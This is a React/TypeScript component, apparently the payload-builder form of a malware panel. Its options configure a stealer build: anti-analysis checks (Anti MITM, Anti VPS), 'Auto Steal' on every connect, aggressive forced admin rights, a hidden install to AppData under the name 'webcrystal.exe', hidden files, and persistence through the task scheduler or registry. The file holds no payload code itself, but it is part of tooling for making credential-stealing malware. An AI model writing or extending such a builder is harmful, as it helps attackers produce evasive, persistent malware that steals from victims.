import { useEffect, useRef, useState } from "react";

import { BuilderField } from "./builder-field";
import { BuilderIconField } from "./builder-icon-field";
import { BuilderSelect } from "./builder-select";
import { BuilderStartupDelay } from "./builder-startup-delay";
import { BuilderTextInput } from "./builder-text-input";
import { inputFixedClass } from "../styles";

export function BuilderForm(props: { open: boolean; mutex: string }) {
  const { open, mutex } = props;

  const [installMode, setInstallMode] = useState<string>("random");
  const [delay, setDelay] = useState<number>(2);
  const [hidden, setHidden] = useState<boolean>(true);
  const [isOpenClass, setIsOpenClass] = useState<boolean>(false);
  const formRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const el = formRef.current;
    if (!el) return;

    if (open) {
      if (hidden) setHidden(false);
      requestAnimationFrame(() => {
        setIsOpenClass(true);
      });
      return;
    }

    setIsOpenClass(false);
    const onEnd = (e: TransitionEvent) => {
      if (e.target !== el) return;
      setHidden(true);
    };
    el.addEventListener("transitionend", onEnd, { once: true });
    return () => {
      try {
        el.removeEventListener("transitionend", onEnd);
      } catch {
        // noop
      }
    };
  }, [open, hidden]);

  return (
    <div
      id="builderForm"
      ref={formRef}
      className={
        isOpenClass
          ? "builderForm isOpen grid place-items-center overflow-visible opacity-100 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:900px] [transform:translateY(0)] mt-[14px]"
          : "builderForm grid place-items-center overflow-hidden opacity-0 transition-[max-height,opacity,transform,margin-top] duration-[260ms] ease-[cubic-bezier(0.25,0.1,0.25,1)] [max-height:0] [transform:translateY(-6px)] mt-0"
      }
      hidden={hidden}
    >
      <div className="builderFormInner grid w-[min(860px,92vw)] gap-[12px] rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] p-[16px] shadow-[0_18px_44px_rgba(0,0,0,0.6),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[8px]">
        <div className="builderGrid grid grid-cols-2 gap-[24px]">
          <div className="builderCol grid gap-[8px]">
            <BuilderField label="name">
              <BuilderTextInput id="buildName" placeholder="name" autoComplete="off" maxLength={25} />
            </BuilderField>

            <BuilderField label="mutex">
              <BuilderTextInput id="buildMutex" value={mutex} readOnly style={{ color: "gray" }} />
            </BuilderField>

            <BuilderField label="Comment">
              <BuilderTextInput id="buildComment" placeholder="comment" autoComplete="off" maxLength={10} />
            </BuilderField>

            <BuilderField label="Anti-analysis">
              <BuilderSelect id="antiAnalysis" defaultValue="None">
                <option value="None">None</option>
                <option value="AntiMitm">Anti Mitm</option>
                <option value="AntiVps">Anti VPS</option>
                <option value="Full">Full</option>
              </BuilderSelect>
            </BuilderField>

            <BuilderField label="Extension">
              <BuilderTextInput
                id="extension"
                value="webcrystal.exe"
                readOnly
                tabIndex={-1}
                style={{ color: "gray" }}
                className={inputFixedClass}
              />
            </BuilderField>

            <BuilderIconField />
          </div>

          <div className="builderCol grid gap-[8px]">
            <BuilderField variant="two" label="Auto Steal">
              <BuilderSelect id="autoSteal" defaultValue="Once">
                <option value="Once">Once</option>
                <option value="Every connect">Every connect</option>
              </BuilderSelect>
            </BuilderField>

            <BuilderField variant="two" label="Force admin">
              <BuilderSelect id="forceAdmin" defaultValue="Normal">
                <option value="Normal">Normal</option>
                <option value="Agressive">Agressive</option>
              </BuilderSelect>
            </BuilderField>

            <BuilderField variant="two" label="Install">
              <BuilderSelect id="installMode" value={installMode} onChange={(e) => setInstallMode(e.target.value)}>
                <option value="random">Random</option>
                <option value="custom">Custom</option>
              </BuilderSelect>
            </BuilderField>

            <BuilderField
              id="installPathRow"
              variant="two"
              label="Path"
              hidden={installMode !== "custom"}
            >
              <BuilderTextInput id="installPath" placeholder="$AppData\\build.exe" autoComplete="off" />
            </BuilderField>

            <BuilderStartupDelay
              delay={delay}
              onMinus={() => setDelay((v) => Math.max(0, v - 1))}
              onPlus={() => setDelay((v) => Math.min(999, v + 1))}
            />

            <BuilderField variant="checkbox" label="Hide files">
              <input
                id="hideFiles"
                className="builderCheck justify-self-start m-0 grid h-[18px] w-[18px] cursor-pointer appearance-none place-items-center rounded-[6px] border border-[rgba(255,255,255,0.18)] bg-[rgba(0,0,0,0.18)] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)] transition-[background,border-color,transform] duration-[140ms] hover:border-[rgba(255,255,255,0.28)] active:translate-y-[1px] checked:bg-[rgba(255,75,75,0.22)] checked:border-[rgba(255,75,75,0.55)] checked:after:content-[''] checked:after:w-[10px] checked:after:h-[6px] checked:after:mt-[-1px] checked:after:border-l-[2px] checked:after:border-b-[2px] checked:after:border-[rgba(255,255,255,0.98)] checked:after:[transform:rotate(-45deg)] focus-visible:shadow-[inset_0_1px_0_rgba(255,255,255,0.06),0_0_0_3px_rgba(255,255,255,0.1)]"
                type="checkbox"
              />
            </BuilderField>

            <BuilderField variant="two" label="Autorun">
              <BuilderSelect id="autorun" defaultValue="scheduler">
                <option value="scheduler">Scheduler</option>
                <option value="scheduler_registry">Scheduler + Registry</option>
                <option value="registry">Registry</option>
                <option value="none">None</option>
              </BuilderSelect>
            </BuilderField>
          </div>
        </div>

        <div id="buildProgress" className="buildProgress grid w-full place-items-center py-[10px]" hidden>
          <div className="buildProgressInner grid h-[210px] w-[min(520px,90vw)] place-items-center rounded-[16px] border border-[rgba(255,255,255,0.14)] bg-[rgba(32,32,32,0.64)] shadow-[0_18px_40px_rgba(0,0,0,0.55),0_0_0_4px_rgba(255,255,255,0.05)] backdrop-blur-[10px]">
            <div id="buildProgressText" className="buildProgressText text-[18px] font-bold text-[rgba(255,255,255,0.92)]">
              Building
            </div>
          </div>
        </div>

        <div className="builderFooter mt-[8px] grid justify-items-center gap-[12px]">
          <div className="builderTabs flex w-full flex-col items-center gap-[4px]" role="tablist" aria-label="Builder tabs">
            <button
              id="createBtn"
              className="builderTab isActive w-[180px] cursor-pointer appearance-none rounded-[12px] border border-[rgba(255,255,255,0.14)] bg-[rgba(20,20,20,0.35)] px-[20px] py-[10px] text-center text-[14px] font-extrabold text-[rgba(255,255,255,0.92)] transition-[background,border-color,transform] duration-[140ms] hover:bg-[rgba(255,255,255,0.04)] hover:border-[rgba(255,255,255,0.18)] active:translate-y-[1px] [border-bottom:4px_solid_var(--line)]"
              type="button"
              data-tab="create"
            >
              Create
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
